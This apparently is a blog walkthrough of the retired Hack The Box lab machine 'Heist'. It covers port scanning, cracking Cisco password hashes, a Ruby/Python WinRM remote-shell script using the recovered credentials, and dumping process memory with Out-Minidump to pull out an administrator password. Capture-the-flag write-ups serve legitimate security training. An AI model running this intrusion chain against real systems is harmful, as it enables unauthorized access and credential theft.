---
layout: post
title: "Heist: Hack The Box Walkthrough"
date: 2019-12-01 05:52:03 +0000
last_modified_at: 2019-12-01 05:52:03 +0000
category: Walkthrough
tags: ["Hack The Box", Heist, retired]
comments: true
image:
  feature: heist-htb-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/photos/taxes-tax-evasion-police-handcuffs-1027103/
---

This post documents the complete walkthrough of Heist, a retired vulnerable [VM][1] created by [MinatoTW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Heist is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.149 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-08-17 05:02:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 135/tcp on 10.10.10.149                                   
Discovered open port 49668/tcp on 10.10.10.149                                 
Discovered open port 5985/tcp on 10.10.10.149                                  
Discovered open port 445/tcp on 10.10.10.149                                   
Discovered open port 80/tcp on 10.10.10.149
```

Hmm. It's Windows alright. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p80,135,445,5985,49668 -A --reason -oN nmap.txt 10.10.10.149
...
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

`nmap` finds RPC, SMB and WinRM open but SMB is not leaking any public shares. We'll just have to explore the `http` service first, which appears to be running PHP. This is what the site looks like.

<a class="image-popup">
![97389986.png](/assets/images/posts/heist-htb-walkthrough/97389986.png)
</a>

The site allows guest login. Check it out.

<a class="image-popup">
![b3097952.png](/assets/images/posts/heist-htb-walkthrough/b3097952.png)
</a>

And there's an attachment!

<a class="image-popup">
![4e6be641.png](/assets/images/posts/heist-htb-walkthrough/4e6be641.png)
</a>

There is one type-5 cisco password hash and two type-7 password hashes. The type-5 password hash is simply MD5, which John the Ripper can easily crack.

<a class="image-popup">
![0be52d2e.png](/assets/images/posts/heist-htb-walkthrough/0be52d2e.png)
</a>

For the two type-7 hashes, I found an online [cracker](http://www.ifm.net.nz/cookbooks/passwordcracker.html) that'll reveal the passwords instanteanously.

So, there we have it. Two-and-a-half pair of credentials.

```
stealth1agent
rout3r:$uperP@ssword
admin: Q4)sJu\Y8qz*A3?d
```

### PowerShell Remoting (sort of)

For one, we know that this credential (`hazard:stealh1agent`) is valid from `smbmap`.

<a class="image-popup">
![c1d55bc2.png](/assets/images/posts/heist-htb-walkthrough/c1d55bc2.png)
</a>

You might ask what's next? Well, WinRM is open, isn't it? We can make use of the WinRM Ruby library, combined with a Python shell to "simulate" a PowerShell session.

Unfortunately, that isn't the correct credential. We need to determine more usernames. Enter Impacket's `lookupsid.py`. This nifty script, combined with `hazard`'s credential will help us in gathering the username we need.

<a class="image-popup">
![b54e3aec.png](/assets/images/posts/heist-htb-walkthrough/b54e3aec.png)
</a>

Long story short, this credential (`chase:Q4)sJu\Y8qz*A3?d`) is the right combination.

<div class="filename"><span>cmd.rb</span></div>

~~~~ruby
require 'winrm'

opts = {
        endpoint: 'http://10.10.10.149:5985/wsman',
        user: 'chase',
        password: 'Q4)sJu\Y8qz*A3?d',
}

# Powershell commands
cmd = ARGV[0]

conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
        output = shell.run(cmd) do |stdout, stderr|
                STDOUT.print stdout
        STDERR.print stderr
        end
#       puts "The script exited with exit code #{output.exitcode}"
end
~~~~

This script takes in one argument: the command to run in PowerShell runspace. Next up, we have a rudimentary Python shell that sends the command to the ruby script.

<div class="filename"><span>shell.py</span></div>

~~~~python
from cmd import Cmd
import os

class Shell(Cmd):

        def do_quit(self, line):
                """Quits the shell"""
                print "Quiting"
                raise SystemExit

        def default(self, line):
                os.system("ruby cmd.rb " + "'" + line + "'")

if __name__ == "__main__":

        s = Shell()
        s.prompt = 'PS> '
        s.cmdloop("Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n")
~~~~

Let's give it a shot.

### Low-Privileged Shell

<a class="image-popup">
![94fc420a.png](/assets/images/posts/heist-htb-walkthrough/94fc420a.png)
</a>

It's all fine and dandy but it's also kinda slow. I'd personally suggest checking [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) which is a far more superior shell, if you haven't already done so.

The file `user.txt` is at `chase`'s desktop.

<a class="image-popup">
![60897bc1.png](/assets/images/posts/heist-htb-walkthrough/60897bc1.png)
</a>

## Privilege Escalation

During enumeration of `chase`'s account, I notice the password hash of what I believe belongs to `administrator` in `login.php`.

<div class="filename"><span>login.php</span></div>

~~~~php
<?php
session_start();
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
                $_SESSION['admin'] = "valid";
                header('Location: issues.php');
        }
        else
                header('Location: errorpage.php');
}
else if( isset($_GET['guest']) ) {
        if( $_GET['guest'] === 'true' ) {
                $_SESSION['guest'] = "valid";
                header('Location: issues.php');
        }
}
?>
~~~~

There's also a subtle hint in `todo.txt` that says something like this.

```
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Something tells me that `chase` is constantly checking `issues.php`.

<a class="image-popup">
![c60711f7.png](/assets/images/posts/heist-htb-walkthrough/c60711f7.png)
</a>

Now, if we can dump out the process memory, maybe we can search for the password from it? Long story short, SysInternal's ProcDump didn't work for me so I went for [`Out-Minidump.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) instead.

I appended the following line to the PowerShell script like so.

```
Out-Minidump -Process (Get-Process -ID 6636) -DumpFilePath C:\Windows\Tracing
```

I chose to dump out process 6636 because it got the most number of handles. Next, I host it with Python's SimpleHTTPServer and download to the machine using `certutil.exe`.

<a class="image-popup">
![fe6c4403.png](/assets/images/posts/heist-htb-walkthrough/fe6c4403.png)
</a>

Time to dump it!

<a class="image-popup">
![003042c7.png](/assets/images/posts/heist-htb-walkthrough/003042c7.png)
</a>

Sweet. Let\s see if we can find we want.

<a class="image-popup">
![f79e74c2.png](/assets/images/posts/heist-htb-walkthrough/f79e74c2.png)
</a>

We can clearly see the credential (`admin@support.htb:4dD!5}x/re8]FBuZ`). Armed with `administrator`'s password, we can get the shell we deserve.

<a class="image-popup">
![bd15d4db.png](/assets/images/posts/heist-htb-walkthrough/bd15d4db.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/201
[2]: https://www.hackthebox.eu/home/users/profile/8308
[3]: https://www.hackthebox.eu/
